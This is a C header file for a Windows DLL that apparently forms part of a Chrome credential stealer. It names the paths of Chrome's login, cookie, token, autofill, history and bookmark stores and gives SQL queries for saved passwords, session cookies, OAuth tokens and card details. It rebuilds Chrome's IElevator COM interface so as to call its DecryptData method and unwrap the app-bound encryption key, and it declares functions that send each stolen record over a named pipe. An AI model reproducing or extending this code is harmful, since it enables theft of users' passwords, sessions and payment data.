#pragma once
#ifndef DLL_HEADERS_H
#define DLL_HEADERS_H

#include <Windows.h>
#include <shlwapi.h>
#include <strsafe.h>
#include <bcrypt.h>

#include "Common.h"

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "bcrypt.lib")


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

// APPB
#define CRYPT_APPBOUND_KEY_PREFIX       'BPPA'
#define CRYPT_APPBOUND_KEY_PREFIX_LEN   4

#define AES_GCM_TAG_SIZE                16
#define AES_GCM_IV_SIZE                 12

// V20
#define CHROME_V20_PREFIX               '02v'
#define CHROME_V20_PREFIX_SIZE          3

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

// File paths
#define WEB_DATA_FILE_PATH              "Google\\Chrome\\User Data\\Default\\Web Data"        
#define HISTORY_FILE_PATH               "Google\\Chrome\\User Data\\Default\\History"
#define COOKIES_FILE_PATH               "Google\\Chrome\\User Data\\Default\\Network\\Cookies"
#define LOGIN_DATA_FILE_PATH            "Google\\Chrome\\User Data\\Default\\Login Data"
#define BOOKMARKS_FILE_PATH             "Google\\Chrome\\User Data\\Default\\Bookmarks"
#define LOCAL_STATE_FILE_PATH           "Google\\Chrome\\User Data\\Local State"

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

// Token Service
#define WEB_DATA_TABLE_NAME             "token_service"
#define COLUMN_SERVICE                  "service"
#define COLUMN_ENCRYPTED_TOKEN          "encrypted_token"
#define COLUMN_BINDING_KEY              "binding_key"
#define SQLQUERY_TOKEN_SERVICE          "SELECT " COLUMN_SERVICE ", " COLUMN_ENCRYPTED_TOKEN ", " COLUMN_BINDING_KEY " FROM " WEB_DATA_TABLE_NAME ";"

// Credit Cards
#define CREDIT_CARDS_TABLE_NAME         "credit_cards"
#define COLUMN_NAME_ON_CARD             "name_on_card"
#define COLUMN_EXPIRATION_MONTH         "expiration_month"
#define COLUMN_EXPIRATION_YEAR          "expiration_year"
#define COLUMN_CARD_NUMBER_ENCRYPTED    "card_number_encrypted"
#define COLUMN_NICKNAME                 "nickname"
#define COLUMN_DATE_MODIFIED            "date_modified"
#define SQLQUERY_CREDIT_CARDS           "SELECT " COLUMN_NAME_ON_CARD ", " COLUMN_EXPIRATION_MONTH ", " COLUMN_EXPIRATION_YEAR ", " COLUMN_CARD_NUMBER_ENCRYPTED ", " COLUMN_NICKNAME ", " COLUMN_DATE_MODIFIED " FROM " CREDIT_CARDS_TABLE_NAME ";"

// Autofill
#define AUTOFILL_TABLE_NAME             "autofill"
#define COLUMN_AUTOFILL_NAME            "name"
#define COLUMN_AUTOFILL_VALUE           "value"
#define COLUMN_AUTOFILL_COUNT           "count"
#define COLUMN_DATE_CREATED             "date_created"
#define SQLQUERY_AUTOFILL               "SELECT " COLUMN_AUTOFILL_NAME ", " COLUMN_AUTOFILL_VALUE ", " COLUMN_DATE_CREATED ", " COLUMN_AUTOFILL_COUNT " FROM " AUTOFILL_TABLE_NAME ";"

// History
#define HISTORY_TABLE_NAME              "urls"
#define COLUMN_URL                      "url"
#define COLUMN_TITLE                    "title"
#define COLUMN_VISIT_COUNT              "visit_count"
#define COLUMN_LAST_VISIT_TIME          "last_visit_time"
#define SQLQUERY_HISTORY                "SELECT " COLUMN_URL ", " COLUMN_TITLE ", " COLUMN_VISIT_COUNT ", " COLUMN_LAST_VISIT_TIME " FROM " HISTORY_TABLE_NAME ";"

// Cookies
#define COOKIES_TABLE_NAME              "cookies"
#define COLUMN_HOST_KEY                 "host_key"
#define COLUMN_PATH                     "path"
#define COLUMN_NAME                     "name"
#define COLUMN_EXPIRES_UTC              "expires_utc"
#define COLUMN_ENCRYPTED_VALUE          "encrypted_value"    
#define SQLQUERY_COOKIES                "SELECT " COLUMN_HOST_KEY ", " COLUMN_PATH ", " COLUMN_NAME ", " COLUMN_EXPIRES_UTC ", " COLUMN_ENCRYPTED_VALUE " FROM " COOKIES_TABLE_NAME ";"

// Logins
#define LOGIN_DATA_TABLE_NAME           "logins"
#define COLUMN_ORIGIN_URL               "origin_url"
#define COLUMN_ACTION_URL               "action_url"
#define COLUMN_USERNAME_VALUE           "username_value"
#define COLUMN_PASSWORD_VALUE           "password_value"
#define COLUMN_DATE_LAST_USED           "date_last_used"
#define SQLQUERY_LOGINS                 "SELECT " COLUMN_ORIGIN_URL ", " COLUMN_ACTION_URL ", " COLUMN_USERNAME_VALUE ", " COLUMN_PASSWORD_VALUE ", " COLUMN_DATE_CREATED ", " COLUMN_DATE_LAST_USED " FROM " LOGIN_DATA_TABLE_NAME ";"

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

// Bookmarks
#define JSON_KEY_TYPE                   "\"type\""
#define JSON_KEY_TYPE_LEN               6
#define JSON_KEY_NAME                   "\"name\""
#define JSON_KEY_NAME_LEN               6
#define JSON_KEY_URL                    "\"url\""
#define JSON_KEY_URL_LEN                5
#define JSON_VALUE_URL                  "url"
#define JSON_VALUE_URL_LEN              3

// Local State App Bound Encryption Key
#define JSON_PARENT_KEY                 "os_crypt"
#define JSON_CHILD_KEY                  "app_bound_encrypted_key"

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

extern HANDLE   g_hPipe;
extern BOOL     g_bPipeInitialized;
extern CHAR     g_szProcessName[MAX_PATH];
extern DWORD    g_dwProcessId;

BOOL InitializeOutputPipe(OUT PHANDLE phPipe);

#define DBGA(fmt, ...)                                                                  \
    do {                                                                                \
        if (!g_szProcessName[0]) {                                                      \
            CHAR szModulePath[MAX_PATH] = { 0 };                                        \
            GetModuleFileNameA(NULL, szModulePath, MAX_PATH);                           \
            lstrcpyA(g_szProcessName, PathFindFileNameA(szModulePath));                 \
            g_dwProcessId = GetCurrentProcessId();                                      \
        }                                                                               \
                                                                                        \
        if (!g_bPipeInitialized)                                                        \
            g_bPipeInitialized = InitializeOutputPipe(&g_hPipe);                        \
                                                                                        \
        SYSTEMTIME stNow;                                                               \
        GetLocalTime(&stNow);                                                           \
                                                                                        \
        LPSTR szBuf = (LPSTR)LocalAlloc(LPTR, BUFFER_SIZE_1024);                        \
        if (szBuf) {                                                                    \
            int nLen = wsprintfA(szBuf,                                                 \
                                 "[%02d:%02d:%02d.%03d-%s-%lu] " fmt "\r\n",            \
                                 stNow.wHour, stNow.wMinute, stNow.wSecond,             \
                                 stNow.wMilliseconds, g_szProcessName,                  \
                                 g_dwProcessId, ##__VA_ARGS__);                         \
                                                                                        \
            if (g_hPipe != INVALID_HANDLE_VALUE) {                                      \
                DWORD dwWritten;                                                        \
                WriteFile(g_hPipe, szBuf, nLen, &dwWritten, NULL);                      \
                FlushFileBuffers(g_hPipe);                                              \
            }                                                                           \
                                                                                        \
            OutputDebugStringA(szBuf);                                                  \
            LocalFree(szBuf);                                                           \
        }                                                                               \
    } while (0)


#define DBGA_CLOSE()                                                                    \
    do {                                                                                \
        if (g_hPipe != INVALID_HANDLE_VALUE) {                                          \
            CloseHandle(g_hPipe);                                                       \
            g_hPipe = INVALID_HANDLE_VALUE;                                             \
        }                                                                               \
        g_bPipeInitialized = FALSE;                                                     \
    } while (0)


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==


typedef enum _PROTECTION_LEVEL
{
    PROTECTION_NONE                 = 0,
    PROTECTION_PATH_VALIDATION_OLD  = 1,
    PROTECTION_PATH_VALIDATION      = 2,
    PROTECTION_MAX                  = 3

} PROTECTION_LEVEL;

typedef struct IElevator IElevator;

typedef struct IElevatorVtbl
{
    // IUnknown
    HRESULT(STDMETHODCALLTYPE* QueryInterface)(IElevator* This, REFIID riid, void** ppvObject);
    ULONG(STDMETHODCALLTYPE* AddRef)(IElevator* This);
    ULONG(STDMETHODCALLTYPE* Release)(IElevator* This);

    // IElevator
    HRESULT(STDMETHODCALLTYPE* RunRecoveryCRXElevated)(
        IElevator*      This,
        const WCHAR*    crx_path,
        const WCHAR*    browser_appid,
        const WCHAR*    browser_version,
        const WCHAR*    session_id,
        DWORD           caller_proc_id,
        ULONG_PTR*      proc_handle
    );

    HRESULT(STDMETHODCALLTYPE* EncryptData)(
        IElevator*          This,
        PROTECTION_LEVEL    protection_level,
        const BSTR          plaintext,
        BSTR*               ciphertext,
        DWORD*              last_error
    );

    // https://github.com/chromium/chromium/blob/225f82f8025e4f93981310fd33daa71dc972bfa9/chrome/elevation_service/elevator.cc#L155
    HRESULT(STDMETHODCALLTYPE* DecryptData)(
        IElevator*      This,
        const BSTR      ciphertext,
        BSTR*           plaintext,
        DWORD*          last_error
    );

} IElevatorVtbl;

struct IElevator
{
    IElevatorVtbl* lpVtbl;
};


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

BOOL SendAppBoundKeyRecord(IN HANDLE hPipe, IN PBYTE pbKey, IN DWORD dwKeyLen);

BOOL SendTokenRecord(IN HANDLE hPipe, IN LPCSTR szService, IN PBYTE pbToken, IN DWORD dwTokenLen, IN OPTIONAL PBYTE pbBindKey, IN OPTIONAL DWORD dwBindKeyLen);

BOOL SendCookieRecord(IN HANDLE hPipe, IN LPCSTR szHostKey, IN LPCSTR szPath, IN LPCSTR szName, IN INT64 llExpiresUtc, IN PBYTE pbEncryptedValue, IN DWORD dwEncryptedValueLen);

BOOL SendLoginRecord(IN HANDLE hPipe, IN LPCSTR szOriginUrl, IN LPCSTR szActionUrl, IN LPCSTR szUsername, IN PBYTE pbEncryptedPassword, IN DWORD dwEncryptedPasswordLen, IN INT64 llDateCreated, IN INT64 llDateLastUsed);

/*
BOOL SendCreditCardRecord(IN HANDLE hPipe, IN LPCSTR szNameOnCard, IN LPCSTR szNickname, IN DWORD dwExpirationMonth, IN DWORD dwExpirationYear, IN INT64 llDateModified, IN PBYTE pbEncryptedCardNumber, IN DWORD dwEncryptedCardNumberLen);
*/

BOOL SendAutofillRecord(IN HANDLE hPipe, IN LPCSTR szName, IN LPCSTR szValue, IN INT64 llDateCreated, IN DWORD dwCount);

BOOL SendHistoryRecord(IN HANDLE hPipe, IN LPCSTR szUrl, IN LPCSTR szTitle, IN DWORD dwVisitCount, IN INT64 llLastVisitTime);

BOOL SendBookmarkRecord(IN HANDLE hPipe, IN LPCSTR szName, IN LPCSTR szUrl, IN INT64 llDateAdded);

LPSTR BytesToHexString(IN PBYTE pbData, IN DWORD cbData);

LPSTR DuplicateAnsiString(IN LPCSTR pszSrc);

LPSTR GetLocalAppDataPath(IN LPCSTR pszRelPath);

VOID CleanupTempFiles();

BOOL ReadFileFromDiskA(IN LPCSTR pszFilePath, OUT PBYTE* ppFileBuffer, OUT PDWORD pdwFileSize);

LPSTR FindJsonStringValue(IN LPCSTR pszJson, IN DWORD cbJson, IN LPCSTR pszKey, OUT PDWORD pcbValue);

LPSTR FindJsonArrayValue(IN LPCSTR pszJson, IN DWORD cbJson, IN LPCSTR pszKey, OUT PDWORD pcbValue);

LPSTR FindNestedJsonValue(IN LPCSTR pszJson, IN DWORD cbJson, IN LPCSTR pszParentKey, IN LPCSTR pszChildKey, OUT PDWORD pcbValue);

PBYTE Base64Decode(IN LPCSTR pszInput, IN DWORD cbInput, OUT PDWORD pcbOutput);

BOOL DecryptChromeV20Secret(IN PBYTE pbKey, IN DWORD cbKey, IN PBYTE pbEncryptedSecret, IN DWORD cbEncryptedSecret, OUT PBYTE* ppbDecryptedSecret, OUT PDWORD pcbDecryptedSecret);

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==


#endif // !DLL_HEADERS_H

